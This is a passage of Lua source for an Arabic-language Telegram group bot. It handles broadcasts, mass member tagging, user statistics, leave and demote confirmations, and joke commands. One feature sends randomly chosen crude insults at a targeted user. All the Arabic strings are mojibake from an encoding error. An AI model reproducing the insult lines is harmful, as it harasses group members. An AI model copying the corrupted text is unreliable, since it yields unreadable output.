send(msg.chat_id_, msg.id_, "โ๏ธููุงุฉ ุงูุงุดุชุฑุงู โซ ["..DevCh.."]")
else
send(msg.chat_id_, msg.id_, "โ๏ธูุงุชูุฌุฏ ููุงุฉ ูู ุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู")
end
return false  
end end
if SudoBot(msg) then
if text == 'ุงุฐุงุนู ูููู ุจุงูุชูุฌูู' and tonumber(msg.reply_to_message_id_) > 0 then
function mustafaTEAM(extra,result,success)
if Devmfm:get(mustafa.."mfm:Send:Bot"..mustafa) and not SecondSudo(msg) then 
send(msg.chat_id_, msg.id_,"โ๏ธุงูุงุฐุงุนู ูุนุทูู ูู ูุจู ุงููุทูุฑ ุงูุงุณุงุณู")
return false
end
local GpList = Devmfm:smembers(mustafa.."mfm:Groups")
for k,v in pairs(GpList) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
local PvList = Devmfm:smembers(mustafa.."mfm:Users")
for k,v in pairs(PvList) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุงุฐุงุนุฉ ุฑุณุงูุชู ุจุงูุชูุฌูู \nโ๏ธโูู โซ โจ '..#GpList..' โฉ ูุฌููุนู \nโ๏ธูุงูู โซ โจ '..#PvList..' โฉ ู๏ฟฝ๏ฟฝุชุฑู \n โ', 1, 'md')
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),mustafaTEAM)
end
end
if text == "ูุดุงูุฏู ุงูููุดูุฑ" and ChCheck(msg) or text == "ูุดุงูุฏุงุช ุงูููุดูุฑ" and ChCheck(msg) or text == "ุนุฏุฏ ุงููุดุงูุฏุงุช" and ChCheck(msg) then
Devmfm:set(mustafa..'mfm:viewget'..msg.sender_user_id_,true)
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุญุณูุง ูู ุจุงุนุงุฏุฉ ุชูุฌูู ููููุดูุฑ ุงูุฐู ุชุฑูุฏูู ุญุณุงุจ ูุดุงูุฏุงุชู', 1, 'md')
end
if text == "ุงูุณูุฑุณ" or text == "ุณูุฑุณ" or text == "ูุง ุณูุฑุณ" then
local text =  [[
๐๐๐๐๐๐๐ ๐๐ ๐๐๐๐๐ ๐๐๐๐๐๐ 
โขโ - - - - - - - - - - - - - - - - - - - - โ

เผ ๏ธ[๐๐๐๐๐๐ ๐๐๐๐๐](https://t.me/KKDKKB7)

เผ๏ธ[๐ซ๐ฌ๐ฝ :  ๐ฒ๐จ๐น๐จ๐น](https://t.me/KKDKKB1)
โขโ - - - - - - - - - - - - - - - - - - - - โ
เผ ๏ธ[๐ซ๐ฌ๐ฝ : ๐ฐ๐ฉ๐น๐จ๐ฏ๐ฌ๐ฌ๐ด](https://t.me/F16_ibra)
]]
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
if ChatType == 'sp' or ChatType == 'gp'  then
if text == "ุงุทุฑุฏูู" and ChCheck(msg) or text == "ุงุฏูุฑูู" and ChCheck(msg) then
if Devmfm:get(mustafa.."mfm:Kick:Me"..msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุนุฐุฑุง ูุฐู ุงูุฎุงุตูู ูุนุทูู ', 1, 'md')
return false
end
Devmfm:set(mustafa..'yes'..msg.sender_user_id_..'', 'delyes')
Devmfm:set(mustafa..'no'..msg.sender_user_id_..'', 'delno')
local Text = 'โ๏ธูู ุงูุช ูุชุฃูุฏ ูู ุงููุบุงุฏุฑู'
keyboard = {} 
keyboard.inline_keyboard = {{{text="ูุนู",callback_data="/delyes"},{text="ูุง",callback_data="/delno"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'ุชุนุทูู ุงุทุฑุฏูู' and Manager(msg) and ChCheck(msg) then
Devmfm:set(mustafa.."mfm:Kick:Me"..msg.chat_id_, true)
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชุนุทูู ุงูุฑ ุงุทุฑุฏูู'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
end
if text == 'ุชูุนูู ุงุทุฑุฏูู' and Manager(msg) and ChCheck(msg) then
Devmfm:del(mustafa.."mfm:Kick:Me"..msg.chat_id_)
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชูุนูู ุงูุฑ ุงุทุฑุฏูู'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
end
if text == "ูุฒููู" and ChCheck(msg) then
if Devmfm:get(mustafa.."mfm:Del:Me"..msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุนุฐุฑุง ูุฐู ุงูุฎุงุตูู ูุนุทูู ', 1, 'md')
return false
end
Devmfm:set(mustafa..'yesdel'..msg.sender_user_id_..'', 'delyes')
Devmfm:set(mustafa..'nodel'..msg.sender_user_id_..'', 'delno')
local Text = 'โ๏ธูู ุงูุช ูุชุฃูุฏ ูู ุชูุฒููู'
keyboard = {} 
keyboard.inline_keyboard = {{{text="ูุนู",callback_data="/yesdel"},{text="ูุง",callback_data="/nodel"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'ุชุนุทูู ูุฒููู' and BasicConstructor(msg) and ChCheck(msg) then
Devmfm:set(mustafa.."mfm:Del:Me"..msg.chat_id_, true)
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชุนุทูู ุงูุฑ ูุฒููู'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
end
if text == 'ุชูุนูู ูุฒููู' and BasicConstructor(msg) and ChCheck(msg) then
Devmfm:del(mustafa.."mfm:Del:Me"..msg.chat_id_)
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชูุนูู ุงูุฑ ูุฒููู'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
end
if Admin(msg) then
if text == "ุชุงู ูููู" and ChCheck(msg) then
function TagAll(dp1,dp2)
local text = "โ๏ธููููู ูุงูุฑุจุน \nโ โ โ โ โ โ โ โ โ\n"
i = 0
for k, v in pairs(dp2.members_) do
i = i + 1
if Devmfm:get(mustafa..'Save:UserName'..v.user_id_) then
text = text..""..i.."~ : [@"..Devmfm:get(mustafa..'Save:UserName'..v.user_id_).."]\n"
else
text = text..""..i.."~ : "..v.user_id_.."\n"
end
end 
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},TagAll,nil)
end
if text and text:match("^ููููู (.*)$") and ChCheck(msg) then
local txt = {string.match(text, "^(ููููู) (.*)$")}
function TagAll(dp1,dp2)
local text = "โ๏ธ"..txt[2].." \nโ โ โ โ โ โ โ โ โ\n"
i = 0
for k, v in pairs(dp2.members_) do
i = i + 1
if Devmfm:get(mustafa..'Save:UserName'..v.user_id_) then
text = text..""..i.."~ : [@"..Devmfm:get(mustafa..'Save:UserName'..v.user_id_).."]\n"
else
text = text..""..i.."~ : "..v.user_id_.."\n"
end
end 
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},TagAll,nil)
end
end
if text == "ุฑุณุงุฆูู" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then
local user_msgs = Devmfm:get(mustafa..'mfm:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุนุฏุฏ ุฑุณุงุฆูู ููุง โซ *โจ "..user_msgs.." โฉ*", 1, 'md')
end
if text == "ุงูุชูุงุนู" and ChCheck(msg) then
local EntryNumber = (Devmfm:get(mustafa..'mfm:EntryNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local ExitNumber = (Devmfm:get(mustafa..'mfm:ExitNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local MsgNumberDay = (Devmfm:get(mustafa..'mfm:MsgNumberDay'..msg.chat_id_..':'..os.date('%d')) or 0)
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุงูุถูุงู ุงูุงุนุถุงุก ุงูููู โซ *"..EntryNumber.."*\nโ๏ธูุบุงุฏุฑุฉ ุงูุงุนุถุงุก ุงูููู โซ *"..ExitNumber.."*\nโ๏ธุนุฏุฏ ุงูุฑุณุงุฆู ุงูููู โซ *"..MsgNumberDay.."*\nโ๏ธูุณุจุฉ ุงูุชูุงุนู ุงูููู โซ *"..math.random(40,100).."%*", 1, 'md')
end
if text == "ูุนุฑูู" and ChCheck(msg) then
function get_username(extra,result,success)
text = 'โ๏ธูุนุฑูู โซ โจ User โฉ'
local text = text:gsub('User',('@'..result.username_ or ''))
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_username)
end
if text == "ุงุณูู" and ChCheck(msg) then
function get_firstname(extra,result,success)
text = 'โ๏ธุงุณูู โซ firstname lastname'
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('lastname',(result.last_name_ or ''))
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_firstname)
end   
if text == "ูุจุฑูุฌ ุงูุณูุฑุณ" then  Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ@KKDKKB1', 1, 'md') end
if text == "ูุทูุฑ ุงูุณูุฑุณ" then  Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ@F16_ibra', 1, 'md') end
if text == "ุงููุณ" or text == "ููุณู" or text == "ุงุฑูุฏ ุจูุช ุงูููุณู" or text == "ุฏุฒูู ุจูุช ุงูููุณู" or  text == "ุฏุฒููู ุจูุช ุงูููุณู" then  Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ@HMSEBOT', 1, 'md') end
if text == "ุฑุงุจุท ุญุฐู" or text == "ุฑุงุจุท ุงูุญุฐู" or text == "ุงุฑูุฏ ุฑุงุจุท ุงูุญุฐู" or  text == "ุดูุฑูู ุฑุงุจุท ุงูุญุฐู" or text == "ุงุฑูุฏ ุฑุงุจุท ุญุฐู" then local inline = {{{text="ุงุถุบุท ููุง",url="https://my.telegram.org/auth"}}} SendInline(msg.chat_id_,'โ๏ธุงุถุบุท ููุญุตูู ุนูู ุงูุฑุงุจุท',nil,inline) return false end
if text == "ุจูุช ุงูุญุฐู" or text == "ุงุฑูุฏ ุจูุช ุงูุญุฐู" or text == "ุงุฑูุฏ ุจูุช ุญุฐู" or text == "ุจูุช ุญุฐู" or text == "ุจูุช ุญุฐู ุญุณุงุจุงุช" or text == "ุฑุงุญ ุงุญุฐู" then local inline = {{{text="ุงุถุบุท ููุง",url="https://my.telegram.org/auth"}}} SendInline(msg.chat_id_,'โ๏ธุงุถุบุท ููุญุตูู ุนูู ุงูุจูุช',nil,inline) return false end
if text == "ุฌูุงุชู" and ChCheck(msg) or text == "ุงุถุงูุงุชู" and ChCheck(msg) then add = (tonumber(Devmfm:get(mustafa..'mfm:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0) Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุนุฏุฏ ุฌูุงุชู ุงููุถุงูู โซ *โจ "..add.." โฉ* ", 1, 'md') end
if text == "ุชุนุฏููุงุชู" or text == "ุณุญูุงุชู" and ChCheck(msg) then local edit_msg = Devmfm:get(mustafa..'mfm:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0  Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุนุฏุฏ ุชุนุฏููุงุชู โซ *โจ "..edit_msg.." โฉ* ", 1, 'md') end
if text == "ุงูุฏูู" and ChCheck(msg) then Dev_mfm(msg.chat_id_, msg.id_, 1,'โ๏ธุงูุฏูู โซ โจ `'..msg.sender_user_id_..'` โฉ', 1, 'md') end
if text == "ุฑุชุจุชู" and ChCheck(msg) then Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุฑุชุจุชู โซ '..IdRank(msg.sender_user_id_, msg.chat_id_), 1, 'html') end
if text == "ุงูุฏู ุงููุฌููุนู" and ChCheck(msg) then Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุงูุฏู ุงููุฌููุนู โซ `"..msg.chat_id_.."`", 1, 'md') end
if text == 'ูุณุญ ุณุญูุงุชู' or text == 'ูุณุญ ุชุนุฏููุงุชู' or text == 'ุญุฐู ุณุญูุงุชู' or text == 'ุญุฐู ุชุนุฏููุงุชู' then Devmfm:del(mustafa..'mfm:EditMsg'..msg.chat_id_..msg.sender_user_id_) Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุญุฐู ุฌููุน ุชุนุฏููุงุชู ุจูุฌุงุญ' , 1, 'md') end
if text == 'ูุณุญ ุฌูุงุชู' or text == 'ูุณุญ ุงุถุงูุงุชู' or text == 'ุญุฐู ุฌูุงุชู' or text == 'ุญุฐู ุงุถุงูุงุชู' then Devmfm:del(mustafa..'mfm:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_) Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุญุฐู ุฌููุน ุฌูุงุชู ุงููุถุงูู' , 1, 'md') end
if text == 'ุงููุทูุฑ' or text == 'ูุทูุฑ' then
local DevCh1 = Devmfm:get(mustafa.."Devmfm3")
local DevText = Devmfm:get(mustafa.."DevText")
if DevCh1 then DevCh = '\nโ๏ธ*Dev Ch* โฌ ['..DevCh1..']' else DevCh = '' end
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,dp) 
if dp.username_ ~= false then DevUser = '@'..dp.username_ else DevUser = dp.first_name_ end
if dp.first_name_ ~= false then DevName = dp.first_name_ else DevName = dp.first_name_ end
if DevText then
Dev_mfm(msg.chat_id_, msg.id_, 1, DevText, 1, "md")
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ*๐๐๐๐* โฌ ['..DevName..']\nโ๏ธ*๐๐๐๐* โฌ ['..DevUser..']\nโ๏ธ*๐๐* โฌ '..DevId..''..DevCh, 1, "md")
end
end,nil)
end
if text and text:match('^ูููู @(.*)') and ChCheck(msg) or text and text:match('^ููููุง @(.*)') then 
if not Devmfm:get(mustafa..'mfm:Lock:Stupid'..msg.chat_id_) then
local username = text:match('^ูููู @(.*)') or text:match('^ููููุง @(.*)') 
function mustafaTEAM(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(mustafa) then  
Dev_mfm(msg.chat_id_, msg.id_, 1, 'ุดู ุชูุถุฑุท ุงูู ูุงุญุฏ ูููู ููุณูุ๐ค๐๐ฟ', 1, 'md')  
return false 
end  
if tonumber(result.id_) == tonumber(DevId) then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'ุฏู ููู ุชุฑูุฏ ุงูููู ุชุงุฌ ุฑุงุณููุ๐๐๐ฟ', 1, 'md') 
return false  
end  
if tonumber(result.id_) == tonumber(1666579759) then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'ุฏู ููู ุชุฑูุฏ ุงูููู ุชุงุฌ ุฑุงุณููุ๐๐๐ฟ', 1, 'md') 
return false  
end  
if Devmfm:sismember(mustafa.."mfm:mfmConstructor:"..msg.chat_id_,result.id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'ุฏู ููู ุชุฑูุฏ ุงูููู ุชุงุฌ ุฑุงุณููุ๐๐๐ฟ', 1, 'md')
return false
end 
local mustafaTEAM = "ุตุงุฑุฑ ุณุชุงุฐูู ๐๐ปโโ๏ธโฅ๏ธ" 
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md') 
local mustafaTEAM = { "ููู ุฌุฑุฌู @"..username.." ุงุญุชุฑู ุงุณูุงุฏูู ูุง ุงูุชููู ูุงุฒุฑุจุจ ุนูู ูุจุฑููุ๐ฉ๐๐ฟ","ูุดุด ููู ูุงุดู @"..username.." ูุชุถู ุชูุณูุช ูุง ุงุฎุฑุจุท ุชุถุงุฑูุณ ูุฌูู ุฌูู ุงุจุท ุนุจุฏูุ ๐๐๐ฟ","ุญุจูุจู @"..username.." ุฑุงุญ ุงุญุงูู ุงุญุชุฑููู ูุงููุฑู ุจููู ุชุจุทู ุญููููุ ๐ค๐ช","ุฏูุดู ูู @"..username.." ููุจูุน ุงููุดู ูู ุฒูู ููููู ููุญุฌู ููุงู ูู ููุจูุฐ ๐๐๐ฟ","ูุง ุงูุบููุถ ุงูุชูุณ ุงุจู ุฑุงุณ ุงููุฑุจุน @"..username.." ูุชุนูููู ุฌู ุญุฌุงูู ูุฌุงู ุชุทูุทููู ุนูููู ุฏุจุทู๐๐ช",}
Dev_mfm(msg.chat_id_, result.id_, 1,''..mustafaTEAM[math.random(#mustafaTEAM)]..'', 1, 'html') 
else  
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุนุถู ุบูุฑ ููุฌูุฏ ูู ุงููุฌููุนู', 1, 'md') 
end 
end 
resolve_username(username,mustafaTEAM)
end
end
if text == ("ูููู") or text == ("ุจุนุฏ ูููู") or text == ("ูููู ุจุนุฏ") or text == ("ูู ูููู") or text == ("ููููุง") or text == ("ููููู") or text == ("ุฑุฒูู") or text == ("ุฑุฒููู") or text == ("ุฑุฒููุง") then
if not Devmfm:get(mustafa..'mfm:Lock:Stupid'..msg.chat_id_) then
function hena(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(mustafa) then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'ุดู ุชูุถุฑุท ุงูู ูุงุญุฏ ูููู ููุณูุ๐ค๐๐ฟ', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_mfm(msg.chat_id_, msg.id_, 1, 'ุฏู ููู ุชุฑูุฏ ุงูููู ุชุงุฌ ุฑุงุณููุ๐๐๐ฟ', 1, 'md')
return false
end 
if tonumber(result.sender_user_id_) == tonumber(1666579759) then  
Dev_mfm(msg.chat_id_, msg.id_, 1, 'ุฏู ููู ุชุฑูุฏ ุงูููู ุชุงุฌ ุฑุงุณููุ๐๐๐ฟ', 1, 'md')
return false
end 
if Devmfm:sismember(mustafa.."mfm:mfmConstructor:"..msg.chat_id_,result.sender_user_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'ุฏู ููู ุชุฑูุฏ ุงูููู ุชุงุฌ ุฑุงุณููุ๐๐๐ฟ', 1, 'md')
return false
end 
local mustafaTEAM = "ุตุงุฑุฑ ุณุชุงุฐูู ๐๐ปโโ๏ธโฅ๏ธ" 
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md') 
local mustafaTEAM = {"ููู ุฌุฑุฌู ุงุญุชุฑู ุงุณูุงุฏูู ูุง ุงูุชููู ูุงุฒุฑุจุจ ุนูู ูุจุฑููุ๐ฉ๐๐ฟ","ูุดุด ูุงุดู ูุชุถู ุชูุณูุช ูุง ุงุฎุฑุจุท ุชุถุงุฑูุณ ูุฌูู ุฌูู ุงุจุท ุนุจุฏูุ ๐๐๐ฟ","ุฏูุดู ูู ููุจูุน ุงููุดู ูู ุฒูู ููููู ููุญุฌู ููุงู ูู ููุจูุฐ ๐๐๐ฟ","ูุง ุงูุบููุถ ุงูุชูุณ ุงุจู ุฑุงุณ ุงููุฑุจุน ูุชุนูููู ุฌู ุญุฌุงูู ูุฌุงู ุชุทูุทููู ุนูููู ุฏุจุทู๐๐ช","ุญุจูุจู ุฑุงุญ ุงุญุงูู ุงุญุชุฑููู ูุงููุฑู ุจููู ุชุจุทู ุญููููุ ๐ค๐ช"} 
Dev_mfm(msg.chat_id_, result.id_, 1,''..mustafaTEAM[math.random(#mustafaTEAM)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),hena)   
end
end
end
if text == ("ุจูุณู") or text == ("ุจุนุฏ ุจูุณู") or text == ("ุถู ุจูุณ") or text == ("ุจูุณู ุจุนุฏ") or text == ("ุจูุณูุง") or text == ("ุจุนุฏ ุจูุณูุง") or text == ("ุถู ุจูุณ") or text == ("ุจูุณูุง ุจุนุฏ") or text == ("ุจูุณูู") then
if not Devmfm:get(mustafa..'mfm:Lock:Stupid'..msg.chat_id_) then
function bosh(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(mustafa) then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'ูููููู ุดูููู ุฑุงุญุญ ุงุจูุณ ููุณููุ๐ถ๐', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_mfm(msg.chat_id_, result.id_, 1, 'ููุงุญุญุญ ุงุญูุงุง ุจูุณุฉุฉ ุงููุทูุฑูู๐ป๐ฅ๐', 1, 'html')
return false
end 
local mustafaTEAM = "ุตุงุฑุฑ ุณุชุงุฐูู ๐๐ปโโ๏ธโฅ๏ธ" 
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md') 
local mustafaTEAM = {"ููุงุญุญุญ ุงููุด ุนุงููููู๐๐ฅ๐","ุงูููููุงุงูุญุญ ุดููุนุณู๐ฅบ๐ฏ๐","ููุงุญุญุญุุกููู ุงุฐูุจ๐คค๐"} 
Dev_mfm(msg.chat_id_, result.id_, 1,''..mustafaTEAM[math.random(#mustafaTEAM)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),bosh)   
end
end
end
if text == ("ุตูุญู") or text == ("ุตูุญูุง") or text == ("ุตูุญูู") or text == ("ุตูุญ") then
if not Devmfm:get(mustafa..'mfm:Lock:Stupid'..msg.chat_id_) then
function seha(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(mustafa) then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'ูููููู ุดูููู ุฑุงุญุญ ุงุตูุญ ููุณููุ๐ถ๐', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_mfm(msg.chat_id_, result.id_, 1, 'ุชุนุงู ูุทูุฑูู ูุญุชุงุฌููู๐๐ปโโ๏ธโฅ๏ธ', 1, 'html')
return false
end 
local mustafaTEAM = "ุตุงุฑุฑ ุณุชุงุฐูู ๐๐ปโโ๏ธโฅ๏ธ" 
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md') 
local mustafaTEAM = {"ุชุชุนุงู ุญุญุจ ูุญุชุงุฌูู๐๐ญ","ุชุนุงู ูููู ุงุณุชุงุฐูู ุงูุฑูุฏููู๐๐ช","ููุนููุฏ ุชุนุงุงู ูุฑูุฏููู๐คโฅ๏ธ","ุชุนุงู ููู ุฏูุตูุญูู๐๐ค"} 
Dev_mfm(msg.chat_id_, result.id_, 1,''..mustafaTEAM[math.random(#mustafaTEAM)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),seha)   
end
end
end
if text and text:match('^ุตูุญู @(.*)') and ChCheck(msg) or text and text:match('^ุตูุญ @(.*)') and ChCheck(msg) then 
if not Devmfm:get(mustafa..'mfm:Lock:Stupid'..msg.chat_id_) then
local username = text:match('^ุตูุญู @(.*)') or text:match('^ุตูุญ @(.*)') 
function mustafaTEAM(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(mustafa) then  
Dev_mfm(msg.chat_id_, msg.id_, 1, 'ูููููู ุดูููู ุฑุงุญุญ ุงุตูุญ ููุณููุ๐ถ๐', 1, 'md')  
return false 
end  
if tonumber(result.id_) == tonumber(DevId) then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'ุชุนุงู ูุทูุฑูู ูุญุชุงุฌููู๐๐ปโโ๏ธโฅ๏ธ @'..username, 1, 'html') 
return false  
end  
local mustafaTEAM = "ุตุงุฑุฑ ุณุชุงุฐูู ๐๐ปโโ๏ธโฅ๏ธ" 
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md') 
local mustafaTEAM = { "ุชุชุนุงู ุญุญุจ @"..username.." ูุญุชุงุฌูู๐๐ญ","ุชุนุงู ูููู @"..username.." ุงุณุชุงุฐูู ุงูุฑูุฏููู๐๐ช","ููุนููุฏ @"..username.." ุชุนุงุงู ูุฑูุฏููู๐คโฅ๏ธ","ุชุนุงู ููู @"..username.." ุฏูุตูุญูู๐๐ค",}
Dev_mfm(msg.chat_id_, result.id_, 1,''..mustafaTEAM[math.random(#mustafaTEAM)]..'', 1, 'html') 
else  
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุนุถู ุบูุฑ ููุฌูุฏ ูู ุงููุฌููุนู', 1, 'md') 
end 
end 
resolve_username(username,mustafaTEAM)
end
end
end
if text == ("ุชูุฒูู ุงููู") and msg.reply_to_message_id_ ~= 0 and Manager(msg) and ChCheck(msg) then 
function promote_by_reply(extra, result, success)
if SudoId(result.sender_user_id_) == true then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธูุงุชุณุชุทูุน ุชูุฒูู ุงููุทูุฑ ุงูุงุณุงุณู", 1, 'md')
return false 
end
if Devmfm:sismember(mustafa..'mfm:SecondSudo:',result.sender_user_id_) then
secondsudo = 'ุงููุทูุฑูู ุงูุซุงููููู โข ' else secondsudo = '' end
if Devmfm:sismember(mustafa..'mfm:SudoBot:',result.sender_user_id_) then
sudobot = 'ุงููุทูุฑูู โข ' else sudobot = '' end
if Devmfm:sismember(mustafa..'mfm:ManagerAll:',result.sender_user_id_) then
managerall = 'ุงููุฏุฑุงุก ุงูุนุงููู โข ' else managerall = '' end
if Devmfm:sismember(mustafa..'mfm:AdminAll:',result.sender_user_id_) then
adminall = 'ุงูุงุฏูููู ุงูุนุงููู โข ' else adminall = '' end
if Devmfm:sismember(mustafa..'mfm:VipAll:',result.sender_user_id_) then
vpall = 'ุงููููุฒูู ุงูุนุงููู โข ' else vpall = '' end
if Devmfm:sismember(mustafa..'mfm:BasicConstructor:'..msg.chat_id_, result.sender_user_id_) then
basicconstructor = 'ุงูููุดุฆูู ุงูุงุณุงุณููู โข ' else basicconstructor = '' end
if Devmfm:sismember(mustafa..'mfm:Constructor:'..msg.chat_id_, result.sender_user_id_) then
constructor = 'ุงูููุดุฆูู โข ' else constructor = '' end 
if Devmfm:sismember(mustafa..'mfm:Managers:'..msg.chat_id_, result.sender_user_id_) then
manager = 'ุงููุฏุฑุงุก โข ' else manager = '' end
if Devmfm:sismember(mustafa..'mfm:Admins:'..msg.chat_id_, result.sender_user_id_) then
admins = 'ุงูุงุฏูููู โข ' else admins = '' end
if Devmfm:sismember(mustafa..'mfm:VipMem:'..msg.chat_id_, result.sender_user_id_) then
vipmem = 'ุงููููุฒูู โข ' else vipmem = '' end
if Devmfm:sismember(mustafa..'mfm:Cleaner:'..msg.chat_id_, result.sender_user_id_) then
cleaner = 'ุงูููุธููู โข ' else cleaner = ''
end
if RankChecking(result.sender_user_id_,msg.chat_id_) ~= false then
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุชูุฒููู ูู โซ โค\n~ ( "..secondsudo..''..sudobot..''..managerall..''..adminall..''..vpall..''..basicconstructor..''..constructor..''..manager..''..admins..''..vipmem..''..cleaner.." ) ~")  
else 
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธูู ุชุชู ุชุฑููุชู ูุณุจูุง")  
end
if mfmDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
Devmfm:srem(mustafa..'mfm:SecondSudo:', result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:SudoBot:', result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:ManagerAll:', result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:AdminAll:', result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:VipAll:', result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Constructor:'..msg.chat_id_,result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Managers:'..msg.chat_id_, result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_, result.sender_user_id_)
